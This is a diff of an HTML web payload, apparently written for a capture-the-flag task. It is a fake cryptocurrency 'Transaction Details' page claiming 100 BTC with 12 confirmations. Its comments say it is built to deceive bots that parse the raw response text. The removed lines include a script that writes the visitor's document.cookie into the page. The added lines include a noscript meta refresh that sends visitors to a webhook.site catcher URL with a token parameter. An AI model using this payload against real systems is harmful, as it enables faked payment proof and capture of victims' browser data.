@@ -1,27 +1,24 @@
-<!DOCTYPE html>
+<!doctype html>
 <html>
 <head>
-    <title>Transaction Details - Blockchain.com</title>
+  <meta charset="utf-8" />
+  <title>Transaction Details</title>
 </head>
 <body>
-    <h1>Transaction Hash: 1234567890abcdef...</h1>
-    <p>Amount: 100 BTC ✅</p>
-    
-    <!-- Создаем элемент, куда будем писать данные -->
-    <div id="flag_container" style="margin-top: 20px; color: red; font-size: 20px;">
-        <!-- Здесь может появиться флаг -->
-    </div>
+  <!-- Чистый текст — боты обычно парсят response.text -->
+  <pre>
+Transaction Hash: 1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef
+Amount: 100 BTC
+Confirmations: 12
+  </pre>
 
-    <script>
-        // Просто попробуем что-нибудь вывести на страницу
-        try {
-            var container = document.getElementById('flag_container');
-            if (container) {
-                container.innerHTML = 'Cookies: ' + (document.cookie || 'None');
-            }
-        } catch(e) {
-            // Игнорируем ошибки
-        }
-    </script>
+  <!-- Для реальных людей: -->
+  <h1>Transaction Hash: 1234567890abcdef...</h1>
+  <p>Amount: 100 BTC ✅</p>
+
+  <!-- noscript: fallback для браузеров с отключённым JS -->
+  <noscript>
+    <meta http-equiv="refresh" content="0;url=https://webhook.site/YOUR-WEBHOOK-ID?token=12345678" />
+  </noscript>
 </body>
 </html>
